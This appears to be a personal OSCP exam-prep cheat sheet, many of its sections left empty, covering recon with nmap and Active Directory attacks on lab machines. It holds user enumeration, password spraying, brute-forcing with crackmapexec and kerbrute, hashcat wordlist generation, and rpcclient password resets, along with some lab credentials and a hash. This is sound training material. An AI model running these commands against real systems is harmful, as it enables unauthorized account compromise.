# RECON

**Discover Hosts**
```
nmap -sn 192.168.29.211/24
```
```
nmap -sn 192.168.29.211/24 | grep for | awk '{print $5}' > availableHosts
```

**Discover Open Ports**
```
nmap -p- --min-rate 10000 10.10.10.184
```
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.184
```

**Scan Ports**
```
nmap -p <PORTS> -sC -sV 10.10.11.243
```
```
nmap -v -sT -A -T4 <PORTS> -Pn --script vuln -oA full 10.11.1.111
```

# ENUMERATE

## SERVICES

#### 21 FTP

#### 22 SSH

#### 23 Telnet

#### 25 SMTP

#### 53 DNS

#### 69 TFTP

#### 80,443 HTTP/s

#### 88 Kerberos

#### 135 RPC

#### 139,445 SMB,SAMBA

#### 161 SNMP

#### 389,636 LDAP

#### 1433 MS-SQL

#### 2049 NFS

#### 3389 RDP

#### 3306 MySQL

#### 5985,5986 WinRM

# WEB

#### SQLI

#### XXS

#### DirTraverse/LFI/RFI

#### Command Injection

#### SSRF

# ACTIVE DIRECTORY

#### USER ENUMERATION

##### Discover Users

Find users with guest or authenticated access

**impacket-lookupsid.py**
```
impacket-lookupsid 'guest'@10.10.130.255
 
impacket-lookupsid 'guest'@10.10.130.255 | cut -d " " -f 2 > usernames.txt

impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb

impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```
**crackmapexec**
```
crackmapexec smb  10.10.130.255 -u 'guest' -p '' --users
crackmapexec smb  10.10.11.202 -u 'SQL_SVC' -p 'REGGIE1234ronnie' --users
```
**impacket-GetADUsers.py**
```
impacket-GetADUsers  'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.131.138 -all
```
**RPCclient**
```
rpcclient -U "" -N 10.10.10.161 
rpcclient $> enumdomusers
```
**Kerbute Username Bruteforce**

[Kerbute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) [Download](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64  
chmod +x kerbrute_linux_amd64 
```
https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt

```
./kerbrute_linux_amd64 userenum /opt/SecLists/Usernames/cirt-default-usernames.txt --dc dc01.manager.htb -d manager.htb
```


##### Confirm Users

***crackmapexec**
```
crackmapexec smb 10.10.130.255 - usernames.txt -p 'foundpassword'
crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
crackmapexec smb 10.10.130.255 - usernames.txt -H hashes.txt
```
```
# if we found users and corresponding passwords or hash (-H) then we can validate like this

crackmapexec smb 10.10.11.158 -u user.txt -p pass.txt --continue-on-success --no-bruteforce
```
**Kerbute**

[Kerbute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) [Download](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64  
chmod +x kerbrute_linux_amd64 
```
```
./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
```

##### Password Spray

**crackmapexec**
```
# Check if any other user uses same password

crackmapexec smb 10.10.130.255 - usernames.txt -p 'foundpassword' --continue-on-success
```

##### Bruteforce

**BruteForce RIDs**

https://0xdf.gitlab.io/2025/02/15/htb-cicada.html#smb---tcp-445

```
crackmapexec smb [ip] -u guest -p '' --rid-brute
```
```
crackmapexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```

**crackmapexec**

Check Password policy and if account lockout threshold is None
```
crackmapexec  smb 10.10.10.172 --pass-pol -u '' -p 
```
Create custom wordlist for bruteforce
```
# put initial usernames and other details found in enumeration in checklist
# add some months and seasons to it

# append year to words
for i in $(cat wordlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done; 

# append ! to words
for i in $(cat wordlist.txt); do echo $i; echo ${i}\!; done > t  

# generate more out of it
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule 
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule

# filter with length more than 7
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' > t
```
bruteforce to try each password with each user.
```
crackmapexec smb 10.10.11.158 -u user.txt -p pass.txt --continue-on-success  
```
**Kerbute Username Bruteforce**

[Kerbute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) [Download](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64  
chmod +x kerbrute_linux_amd64 
```
https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt

```
./kerbrute_linux_amd64 userenum /opt/SecLists/Usernames/cirt-default-usernames.txt --dc dc01.manager.htb -d manager.htb
```

##### Reset Password

**RPCclient**

This is very useful when you need to reset password of user form linux since you dont have shell on windows machine
```
# use the command setuserinfo2

└─$ rpcclient -U "support" 10.10.10.192 
Password for [WORKGROUP\support]:

# note password not machin policy will give such error

rpcclient $> setuserinfo2 audit2020 23 '0xdf'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION

# password that is according to policy will be accepted silently

rpcclient $> setuserinfo2 audit2020 23 '0xdf!!!'
rpcclient $> 
```
This can also be done in one line
```
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
```


#### Abuse Authentication

#### BloodHound Analysis

#### Abuse Misconfigurations

#### Credential Dumping

#### Post Enumeration

#### Windows Privilege Escalation

# Linux

#### Post Enumeration

#### Linux Privilege Escalation

# BRUTE FORCE

# PAYLOADS



# TRANSFER PAYLOADS

# CRACK PASSWORDS

# Exam Specific

#### Local.txt / Proof.txt


#### More on OSCP
https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide-Newly-Updated


https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ-Newly-Updated#h_01FP8CCWDT0GX03RCE6RGYRZT4

https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes